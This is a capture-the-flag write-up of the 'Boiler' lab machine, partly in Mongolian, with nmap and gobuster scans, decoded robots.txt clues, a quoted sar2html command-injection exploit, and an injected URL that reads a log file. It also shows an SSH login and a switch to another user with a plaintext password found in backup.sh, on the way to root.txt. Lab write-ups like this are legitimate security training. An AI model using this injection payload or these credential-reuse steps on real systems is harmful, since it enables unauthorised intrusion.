# Boiler

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/d603f045-89f9-4607-9e2d-88f4de0ca771)

```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ sudo nmap -sC -sV 10.10.243.35        
[sudo] password for melle: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-21 13:42 CDT
Nmap scan report for 10.10.243.35
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.221.83
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.30 seconds

```

* FTP (Port 21) : Anonymous FTP login allowed
* HTTP (Port 80) : Apache httpd 2.4.18
* Webmin (Port 10000) : MiniServ 1.930 (Webmin httpd)

* 
``` 
* http://10.10.243.35/robots.txt
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075

```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/285944a4-632c-4c95-acd0-3a3a6f2368d3)
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4fbcd9c5-2c7b-41e1-9cdd-40a7245cdebc)

```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 99b0660cd95adea327c54182baa51584

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/2c19cc18-a38c-490b-8f5b-32fbfdb5825c)
` result:kidding
`

### Gobuster 
```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ gobuster dir -u http://10.10.243.35 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.243.35
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 11321]
/joomla               (Status: 301) [Size: 313] [--> http://10.10.243.35/joomla/]
/manual               (Status: 301) [Size: 313] [--> http://10.10.243.35/manual/]
/robots.txt           (Status: 200) [Size: 257]
/server-status        (Status: 403) [Size: 300]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```
#### gobuster dir -u http://10.10.92.152/joomla/
```
└─$ gobuster dir -u http://10.10.92.152/joomla/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.92.152/joomla/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 303]
/_archive             (Status: 301) [Size: 322] [--> http://10.10.92.152/joomla/_archive/]
/_database            (Status: 301) [Size: 323] [--> http://10.10.92.152/joomla/_database/]
/_files               (Status: 301) [Size: 320] [--> http://10.10.92.152/joomla/_files/]
/.hta                 (Status: 403) [Size: 298]
/_test                (Status: 301) [Size: 319] [--> http://10.10.92.152/joomla/_test/]
/~www                 (Status: 301) [Size: 318] [--> http://10.10.92.152/joomla/~www/]
/.htaccess            (Status: 403) [Size: 303]
/administrator        (Status: 301) [Size: 327] [--> http://10.10.92.152/joomla/administrator/]
/bin                  (Status: 301) [Size: 317] [--> http://10.10.92.152/joomla/bin/]
/build                (Status: 301) [Size: 319] [--> http://10.10.92.152/joomla/build/]
/cache                (Status: 301) [Size: 319] [--> http://10.10.92.152/joomla/cache/]
/components           (Status: 301) [Size: 324] [--> http://10.10.92.152/joomla/components/]
/images               (Status: 301) [Size: 320] [--> http://10.10.92.152/joomla/images/]
/includes             (Status: 301) [Size: 322] [--> http://10.10.92.152/joomla/includes/]
/index.php            (Status: 200) [Size: 12478]
/installation         (Status: 301) [Size: 326] [--> http://10.10.92.152/joomla/installation/]
/language             (Status: 301) [Size: 322] [--> http://10.10.92.152/joomla/language/]
/layouts              (Status: 301) [Size: 321] [--> http://10.10.92.152/joomla/layouts/]
/libraries            (Status: 301) [Size: 323] [--> http://10.10.92.152/joomla/libraries/]
/media                (Status: 301) [Size: 319] [--> http://10.10.92.152/joomla/media/]
/modules              (Status: 301) [Size: 321] [--> http://10.10.92.152/joomla/modules/]
/plugins              (Status: 301) [Size: 321] [--> http://10.10.92.152/joomla/plugins/]
/templates            (Status: 301) [Size: 323] [--> http://10.10.92.152/joomla/templates/]
/tests                (Status: 301) [Size: 319] [--> http://10.10.92.152/joomla/tests/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.92.152/joomla/tmp/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

####  /_test хандан орж үзхэд
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/b0315f5a-1840-4e1b-af99-9301018c5ddb)
#### sar2html 
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/bfdba720-c569-4047-a175-80caff604b36)

####  sar2html 
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/e677d9f9-160e-4d40-8264-91253056e7ab)

```
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
            
```
### http://<ipaddr>/index.php?plot=;<command-here> will execute 
`http://10.10.92.152/joomla/_test/index.php?plot=;%20cat%20log.txt ` 
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/33228786-b0a4-4e8a-984f-3893d1e56517)

```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ ssh basterd@10.10.243.35 -p 55007
The authenticity of host '[10.10.243.35]:55007 ([10.10.243.35]:55007)' can't be established.
ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.243.35]:55007' (ED25519) to the list of known hosts.
basterd@10.10.243.35's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$ ls
```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/2dd73831-6b03-46ee-946f-cbb2bb25b55d)

```
$ ls -la
total 16
drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .
drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache
```

##### ![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/5cef0e85-1dbb-4c22-9ec1-00b7762ecf39)
backup.sh 


```
USER=stoner
#superduperp@$$no1knows

```

```
$ su stoner
Password: 
stoner@Vulnerable:/home/basterd$ ls
ls: cannot open directory '.': Permission denied
stoner@Vulnerable:/home/basterd$ ls -la
ls: cannot open directory '.': Permission denied
stoner@Vulnerable:/home/basterd$ ls -lpa
ls: cannot open directory '.': Permission denied
stoner@Vulnerable:/home/basterd$ cd 
stoner@Vulnerable:~$ ls
stoner@Vulnerable:~$ ls -la
total 16
drwxr-x--- 3 stoner stoner 4096 Aug 22  2019 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret

```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/3dc7bf46-e479-4072-b06e-e5b1b4fc7258)
*
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/c77bae1d-bba5-4302-9787-e3c61f5978f6)
*
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/bedfc672-2771-4c0f-9153-836885df239c)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4fbd66d5-52b0-474a-9b99-ca347b32eaa5)

` # cat root.txt
It wasn't that hard, was it? `





















































